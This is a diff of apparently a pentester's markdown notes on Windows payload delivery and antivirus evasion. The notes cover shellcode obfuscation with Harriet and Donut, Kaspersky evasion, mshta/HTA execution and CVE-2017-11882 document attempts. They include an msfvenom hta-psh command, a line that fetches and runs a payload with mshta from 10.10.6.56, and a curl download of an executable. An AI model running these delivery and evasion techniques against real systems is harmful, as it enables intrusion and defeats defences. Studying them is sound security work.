@@ -59,7 +59,6 @@ and SigThief - this is  already done by Harriot.
 
 If you’re doing this in a real world pentest, put the shellcode through Harriet as we did before, use Donut to turn it back into shellcode and then inject it for more OPSEC
 
-
 6. generate hta to create something similar to linkzip exploit
 
 https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution
@@ -162,6 +161,9 @@ not able to get connection back after CLRvoyance
 
 5. checkout how to integrate python with C
 
+6. Kaspersky evasion
+
+![](./kaspersky_evaded.png)
 
 ## things to try to create a lnk file :
 
@@ -200,6 +202,33 @@ The converted shellcode  is not working in shellcode runner
 https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md
 
 study lnk exploit
+
+### Trying 11882 delivery mechanism
+
+was not able to work with unamer's implementation
+
+embedi rtf works on windows 2010 but no poc
+
+trying from https://www.cnblogs.com/Hi-blog/p/7878054.html 
+
+able to generate calc from doc here starnight's implementation.
+
+```
+CreateObject(“Wscript.Shell”).Run “calc.exe”
+```
+`sudo msfvenom -p windows/x64/exec CMD=calc.exe EXIT_FUNC=THREAD -f hta-psh > abc` when trying to run with mshta
+
+`mshta http://10.10.6.56:8000/abc`
+
+not working
+
+from lolbas mshta download and execute exploit was searhed
+
+however it was found tha tmshta doesnot work so instead we tried executing the binary itself.
+
+THen we needed to reduce thenumber of characterused so thatit can be put in a file within 43 bytes
+
+one thing to try: `curl <server name> -L -o a.exe`
 
 
 
